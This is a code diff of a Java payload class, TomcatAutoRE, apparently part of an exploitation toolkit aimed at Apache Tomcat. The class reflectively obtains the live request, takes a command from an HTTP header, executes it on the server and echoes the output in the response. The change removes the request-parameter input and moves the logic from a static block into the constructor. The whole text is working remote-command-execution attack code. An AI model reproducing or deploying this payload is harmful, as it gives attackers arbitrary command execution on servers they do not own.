@@ -15,31 +15,18 @@ import java.util.*;
  */
 @Middleware(Middleware.Tomcat)
 @JavaClassType(JavaClassType.AutoFind)
-@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
+@JavaClassModifiable({JavaClassModifiable.HEADER})
 public class TomcatAutoRE {
     private static String HEADER;
-    private static String PARAM;
 
     public TomcatAutoRE() {
-
-    }
-
-    static {
         try {
             Object request = getTargetObject("org.apache.coyote.Request");
             Object response = invokeMethod(request, "getResponse", new Class[]{}, new Object[]{});
 
             Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-            Object parameters = invokeMethod(request, "getParameters", new Class[]{}, new Object[]{});
-            Object param = invokeMethod(parameters, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
 
-            String str = null;
-            if (header != null) {
-                str = (String) header;
-            } else if (param != null) {
-                str = (String) param;
-            }
-            String result = exec(str);
+            String result = exec((String) header);
             invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
             try {
                 invokeMethod(response, "doWrite", new Class[]{java.nio.ByteBuffer.class}, new Object[]{java.nio.ByteBuffer.wrap(result.getBytes())});
